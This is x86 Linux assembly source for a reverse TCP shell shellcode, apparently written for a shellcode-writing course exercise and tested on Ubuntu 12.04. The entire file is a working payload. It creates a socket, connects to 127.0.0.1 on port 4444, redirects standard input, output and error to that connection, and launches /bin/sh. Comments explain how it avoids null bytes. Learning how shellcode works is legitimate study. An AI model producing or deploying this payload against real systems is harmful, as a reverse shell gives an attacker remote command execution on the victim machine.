
; Shellcode Title: Reverse TCP Shell
; Date: 20-02-2018
; Student Id: SLAE-1058
; Tested on: Ubuntu 12.04 LTS x86


global _start

section .text
_start:


; syscall socketcall
; #define __NR_socketcall         102
; socket()
; #define SYS_SOCKET	1		/* sys_socket(2)		*/

	xor ebx, ebx    		; set ebx to zero
	mul ebx					; set eax/edx to zero
					
	push eax        		; push 0, last arg from socket
	push 0x01       		; push 1, SOCK_STREAM
	push 0x02       		; push 2, AF_INET
	mov ecx, esp			; ECX points now to all arguments

	mov al, 0x66
	mov bl, 0x01
	int 0x80


; syscall socketcall
; #define __NR_socketcall         102
; connect()
; #define SYS_CONNECT	3		/* sys_connect(2)		*/

	mov edi, eax			; store eax to edi (eax = sockfd from previous syscall)

	; Prepare sockaddr_in structure:
	mov byte [esp], 0x7f	; push 127
	mov byte [esp+1], dl	; dl == 0. we avoid bad chars when trying to connect to 127.0.0.1
	mov byte [esp+2], dl
	mov byte [esp+3], 0x01
	push word 0x5c11		; push 4444
	push word 0x02			; push AF_INET
	
	mov ecx, esp			; mov in ECX the sockaddr_in structure pointer to use in connect()
	
	; push connect() arguments
	push 0x10				; sizeof() 16
	push ecx				; push sockadd_in address
	push edi				; push stored socket

	mov ecx, esp
	mov al, 0x66
	mov bl, 0x03
	int 0x80

; syscall dup2
; #define __NR_dup2                63
; loop from 2 to 0 and execute 0x80 for each one.

	mov ebx, edi			; store sockfd to ebx, used in dup2() as first argument
	xor ecx,ecx			
	mul ecx			
	mov cl, 0x2				; mov 2 to cl (dup 2, 1, 0)
			
dup2:			
	mov al, 0x3f			; this mov is here because of the return of each int 0x80
	int 0x80			
	dec ecx			
	jns dup2				; jump to dup2 if ecx != -1 (sf == 0)


; syscall execve
; #define __NR_execve              11
; execute /bin/sh

	xor eax,eax
	push eax
	push 0x68732f2f			; hs// - take care to the little endian representation
	push 0x6e69622f			; nib/
	mov ebx, esp			; pointer to command string
	mov ecx, eax
	mov edx, eax
	mov al, 11
	int 0x80
